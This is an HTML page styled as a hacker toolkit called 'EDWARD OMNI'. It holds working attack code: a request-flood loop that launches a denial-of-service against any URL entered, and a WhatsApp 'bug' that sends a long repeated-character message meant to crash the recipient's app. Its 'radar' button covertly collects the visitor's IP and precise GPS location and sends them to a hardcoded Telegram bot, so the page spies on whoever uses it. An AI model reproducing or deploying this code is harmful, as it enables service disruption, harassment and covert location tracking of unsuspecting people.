<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI</title>
    <style>
        :root { --neon: #0f0; --bg: #000; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 20px; }
        .header-title { font-size: 18px; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); margin: 20px 0; font-weight: bold; text-align: center; }
        .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; background: rgba(10, 10, 10, 0.8); box-shadow: 0 0 15px rgba(0, 255, 0, 0.1); }
        h3 { margin: 0 0 15px 0; font-size: 13px; color: #fff; letter-spacing: 2px; }
        input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 10px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 12px; }
        .btn-wa { background: #25D366; color: #000; }
        .btn-phish { background: #bc13fe; color: #fff; }
        .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
        #statusAttack { font-size: 10px; color: #ff0000; margin-top: 10px; display: none; text-align: center; }
        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .radar-ring { width: 220px; height: 220px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; border-right: 1px solid var(--neon); }
        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="header-title">EDWARD OMNI</div>

    <div class="card">
        <h3>WHATSAPP BUG</h3>
        <input type="number" id="noWA" placeholder="Target (628...)">
        <button class="btn btn-wa" onclick="startWA()">EXECUTE ☠️</button>
    </div>

    <div class="card">
        <h3>PHISHING KILLER</h3>
        <input type="text" id="targetUrl" placeholder="URL Target Penipu">
        <button class="btn btn-phish" id="atkBtn" onclick="toggleAttack()">LAUNCH SILENT ATTACK 🔥</button>
        <div id="statusAttack">ATTACKING SERVER: [ SENDING PACKETS... ]</div>
    </div>

    <div class="card">
        <h3>SATELLITE RADAR</h3>
        <button class="btn btn-radar" onclick="startRadar()">ACTIVATE RADAR 📡</button>
    </div>

    <div id="radarOverlay">
        <div class="radar-ring"><div class="sweep"></div></div>
        <p id="st" style="margin-top:30px; font-size:10px; letter-spacing:2px;">SCANNING...</p>
        <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:20px;">[ CLOSE ]</button>
    </div>

    <script>
        let isAttacking = false;
        let attackInterval;

        function toggleAttack() {
            let u = document.getElementById('targetUrl').value;
            if(!u) return alert("Masukkan URL!");
            
            const btn = document.getElementById('atkBtn');
            const status = document.getElementById('statusAttack');

            if(!isAttacking) {
                isAttacking = true;
                btn.innerText = "STOP ATTACK 🛑";
                status.style.display = "block";
                
                // Serangan Latar Belakang (Silent Flood)
                attackInterval = setInterval(() => {
                    for(let i=0; i<50; i++) {
                        fetch(u, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
                    }
                }, 100);
            } else {
                isAttacking = false;
                btn.innerText = "LAUNCH SILENT ATTACK 🔥";
                status.style.display = "none";
                clearInterval(attackInterval);
            }
        }

        async function startRadar() {
            document.getElementById('radarOverlay').style.display = 'flex';
            try {
                const ipR = await fetch('https://api.ipify.org?format=json');
                const ipD = await ipR.json();
                navigator.geolocation.getCurrentPosition((p) => {
                    let m = "🔱 [ LOCKED ] 🔱\nIP: "+ipD.ip+"\nLOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
                    fetch("https://api.telegram.org/bot8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g/sendMessage?chat_id=7898572558&text="+encodeURIComponent(m));
                    document.getElementById('st').innerText = "SUCCESS: DATA SENT";
                }, null, {enableHighAccuracy:true});
            } catch(e){}
        }

        function startWA() {
            let n = document.getElementById('noWA').value;
            window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=జ్ఞా".repeat(200);
        }
    </script>
</body>
</html>
